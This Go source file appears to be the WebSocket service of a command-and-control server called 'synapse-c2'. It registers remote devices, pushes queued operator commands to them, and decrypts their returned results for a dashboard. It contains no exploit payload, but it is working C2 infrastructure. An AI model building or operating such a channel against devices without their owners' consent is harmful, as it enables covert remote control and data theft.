package service

import (
	"context"
	"encoding/json"
	"net/http"
	"time"

	"synapse-c2/app/synapse-c2/internal/model"

	"github.com/gogf/gf/v2/frame/g"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins for C2
	},
}

// HandleWebSocket manages a single device WebSocket connection.
func HandleWebSocket(ctx context.Context, conn *websocket.Conn) {
	defer conn.Close()

	var deviceID string

	// Set read deadline for initial registration
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	for {
		_, msgBytes, err := conn.ReadMessage()
		if err != nil {
			if deviceID != "" {
				g.Log().Infof(ctx, "Device %s disconnected: %v", deviceID, err)
				Registry.Unregister(deviceID)
			}
			return
		}

		var msg model.WSMessage
		if err := json.Unmarshal(msgBytes, &msg); err != nil {
			g.Log().Warningf(ctx, "WS invalid JSON: %v", err)
			continue
		}

		switch msg.Type {
		case "register":
			if msg.DeviceID == "" {
				g.Log().Warning(ctx, "WS register without device_id")
				continue
			}
			deviceID = msg.DeviceID

			info := model.DeviceInfo{}
			if msg.Info != nil {
				info = *msg.Info
			}

			dev := Registry.Register(deviceID, info, conn)
			dev.Lock()
			dev.WS = conn
			dev.Unlock()

			// Reset read deadline for normal operation
			conn.SetReadDeadline(time.Time{})

			g.Log().Infof(ctx, "Device registered via WS: %s (model=%s, os=%s)",
				deviceID, info.Model, info.OSVersion)

			// Send any queued commands
			go pushQueuedCommands(ctx, deviceID, conn)

		case "result":
			handleResult(ctx, msg)

		case "ping":
			Registry.MarkSeen(deviceID)
			resp := model.WSMessage{Type: "pong"}
			data, _ := json.Marshal(resp)
			conn.WriteMessage(websocket.TextMessage, data)
		}
	}
}

// pushQueuedCommands sends all queued commands to the device over WS.
func pushQueuedCommands(ctx context.Context, deviceID string, conn *websocket.Conn) {
	cmds := Registry.DequeueCommands(deviceID)
	for _, cmd := range cmds {
		wsMsg := model.WSMessage{
			Type:      "command",
			CommandID: cmd.ID,
			Module:    cmd.Module,
			Action:    cmd.Action,
			Params:    cmd.Params,
		}
		data, err := json.Marshal(wsMsg)
		if err != nil {
			g.Log().Errorf(ctx, "WS marshal command: %v", err)
			continue
		}
		if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
			g.Log().Errorf(ctx, "WS write command to %s: %v", deviceID, err)
			return
		}
		g.Log().Infof(ctx, "Command pushed to %s: %s/%s [%s]",
			deviceID, cmd.Module, cmd.Action, cmd.ID)
	}
}

// PushCommandToDevice sends a single command to a connected device via WS.
func PushCommandToDevice(ctx context.Context, cmd model.Command) {
	dev := Registry.Get(cmd.DeviceID)
	if dev == nil {
		g.Log().Warningf(ctx, "Device not found: %s", cmd.DeviceID)
		return
	}

	dev.Lock()
	ws := dev.WS
	dev.Unlock()

	if ws == nil {
		g.Log().Infof(ctx, "Device %s not connected via WS, queuing command", cmd.DeviceID)
		Registry.EnqueueCommand(cmd)
		return
	}

	wsMsg := model.WSMessage{
		Type:      "command",
		CommandID: cmd.ID,
		Module:    cmd.Module,
		Action:    cmd.Action,
		Params:    cmd.Params,
	}
	data, err := json.Marshal(wsMsg)
	if err != nil {
		g.Log().Errorf(ctx, "WS marshal command: %v", err)
		Registry.EnqueueCommand(cmd)
		return
	}

	if err := ws.WriteMessage(websocket.TextMessage, data); err != nil {
		g.Log().Errorf(ctx, "WS write to %s: %v, queuing", cmd.DeviceID, err)
		Registry.EnqueueCommand(cmd)
		return
	}

	g.Log().Infof(ctx, "Command sent to %s via WS: %s/%s [%s]",
		cmd.DeviceID, cmd.Module, cmd.Action, cmd.ID)
}

// handleResult processes an incoming result from a device.
func handleResult(ctx context.Context, msg model.WSMessage) {
	deviceID := msg.DeviceID

	// Try to decrypt the data
	decrypted := ""
	if msg.Data != "" {
		plain, err := Decrypt(msg.Data)
		if err != nil {
			g.Log().Warningf(ctx, "Result decrypt failed from %s: %v", deviceID, err)
			decrypted = msg.Data // Use raw if decrypt fails
		} else {
			decrypted = plain
		}
	}

	g.Log().Infof(ctx, "=== RESULT from %s [cmd=%s] ===\n%s\n================================",
		deviceID, msg.CommandID, decrypted)

	// Broadcast to dashboard
	result := model.DashboardResult{
		DeviceID:  deviceID,
		CommandID: msg.CommandID,
		Module:    msg.Module,
		Action:    msg.Action,
		Data:      decrypted,
		Time:      time.Now().Format(time.RFC3339),
	}
	Broadcaster.Broadcast(result)

	Registry.MarkSeen(deviceID)
}
